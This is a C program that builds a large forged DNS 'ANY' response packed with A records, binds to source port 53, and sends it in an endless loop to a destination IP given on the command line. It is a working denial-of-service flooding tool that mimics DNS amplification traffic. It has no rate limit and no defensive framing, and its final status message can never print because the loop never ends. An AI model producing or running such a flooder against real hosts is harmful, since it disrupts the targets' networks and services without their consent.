#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>

#define BUFFER_SIZE 1500
#define MAX_DNS_SIZE 1400
#define DEST_PORT 53

struct dns_header {
    unsigned short id; // identification number
    unsigned char rd :1; // recursion desired
    unsigned char tc :1; // truncated message
    unsigned char aa :1; // authoritative answer
    unsigned char opcode :4; // purpose of message
    unsigned char qr :1; // query/response flag
    unsigned char rcode :4; // response code
    unsigned char cd :1; // checking disabled
    unsigned char ad :1; // authenticated data
    unsigned char z :1; // its z! reserved
    unsigned char ra :1; // recursion available
    unsigned short q_count; // number of question entries
    unsigned short ans_count; // number of answer entries
    unsigned short auth_count; // number of authority entries
    unsigned short add_count; // number of resource entries
};

size_t generate_dns_any_response(char *buffer) {
    struct dns_header *dns = (struct dns_header *)buffer;

    // Clear the buffer
    memset(buffer, 0, BUFFER_SIZE);

    // Set up the DNS header
    dns->id = htons((unsigned short)rand()); // Random ID
    dns->qr = 1; // Response
    dns->opcode = 0; // Standard query
    dns->aa = 1; // Authoritative answer
    dns->rd = 1; // Recursion desired
    dns->ra = 1; // Recursion available
    dns->rcode = 0; // No error
    dns->q_count = htons(1); // One question
    dns->ans_count = htons(1); // Will increase this later
    dns->auth_count = 0;
    dns->add_count = 0;

    // DNS question section for "example.com" ANY query
    const char question[] = {
        0x07, 'e', 'x', 'a', 'm', 'p', 'l', 'e', // Length 7, then the characters
        0x03, 'c', 'o', 'm',                     // Length 3, then the characters
        0x00                                    // Null terminator
    };

    // Copy question section into the buffer
    size_t offset = sizeof(struct dns_header);
    memcpy(buffer + offset, question, sizeof(question));
    offset += sizeof(question);

    unsigned short qtype = htons(255); // ANY type
    unsigned short qclass = htons(1); // IN (Internet)
    memcpy(buffer + offset, &qtype, sizeof(qtype));
    offset += sizeof(qtype);
    memcpy(buffer + offset, &qclass, sizeof(qclass));
    offset += sizeof(qclass);

    unsigned short name_pointer = htons(0xC00C); // Pointer to the question
    unsigned short type_a = htons(1);            // Type A (IPv4 address)
    unsigned short class_in = htons(1);          // Class IN (Internet)
    unsigned int ttl = htonl(3600);              // TTL of 1 hour
    unsigned short data_len = htons(4);          // Data length (4 bytes for an IPv4 address)
    unsigned char ip_address[4] = { 192, 0, 2, 1 }; // Example IP address (change as needed)

    int answer_count = 0;
    while (offset + 16 <= MAX_DNS_SIZE) { // Each answer is 16 bytes long
        memcpy(buffer + offset, &name_pointer, sizeof(name_pointer));
        offset += sizeof(name_pointer);

        memcpy(buffer + offset, &type_a, sizeof(type_a));
        offset += sizeof(type_a);

        memcpy(buffer + offset, &class_in, sizeof(class_in));
        offset += sizeof(class_in);

        memcpy(buffer + offset, &ttl, sizeof(ttl));
        offset += sizeof(ttl);

        memcpy(buffer + offset, &data_len, sizeof(data_len));
        offset += sizeof(data_len);

        // Add an IP address (can vary it if needed)
        ip_address[3] = (unsigned char)(1 + answer_count % 255); // Just to vary it slightly
        memcpy(buffer + offset, ip_address, sizeof(ip_address));
        offset += sizeof(ip_address);

        answer_count++;
    }

    // Update answer count in the DNS header
    dns->ans_count = htons(answer_count);

    // Calculate the total size of the DNS response
    return offset;
}

int main(int argc, char *argv[]) {
    if (argc != 2) {
        fprintf(stderr, "Usage: %s <destination IP>\n", argv[0]);
        return 1;
    }

    char *dest_ip = argv[1];
    int sockfd;
    struct sockaddr_in dest_addr;
    char buffer[BUFFER_SIZE];

    // Generate DNS ANY response
    size_t dns_size = generate_dns_any_response(buffer);

    // Create socket
    if ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
        perror("Socket creation failed");
        return 1;
    }

    // Set up the destination address
    memset(&dest_addr, 0, sizeof(dest_addr));
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_port = htons(DEST_PORT);
    inet_pton(AF_INET, dest_ip, &dest_addr.sin_addr);

    // Set the source port to 53
    struct sockaddr_in src_addr;
    memset(&src_addr, 0, sizeof(src_addr));
    src_addr.sin_family = AF_INET;
    src_addr.sin_addr.s_addr = INADDR_ANY;
    src_addr.sin_port = htons(53); // Source port 53

    if (bind(sockfd, (struct sockaddr *)&src_addr, sizeof(src_addr)) < 0) {
        perror("Binding failed");
        close(sockfd);
        return 1;
    }

    // Send the DNS response
    while (1) {
    	sendto(sockfd, buffer, dns_size, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));
    	//if (sendto(sockfd, buffer, dns_size, 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr)) < 0) {
        //	perror("Sendto failed");
        //	close(sockfd);
        //	return 1;
    	//}
    }

    printf("Sent DNS ANY response with %d answers (%zu bytes)\n", ntohs(((struct dns_header *)buffer)->ans_count), dns_size);

    close(sockfd);
    return 0;
}

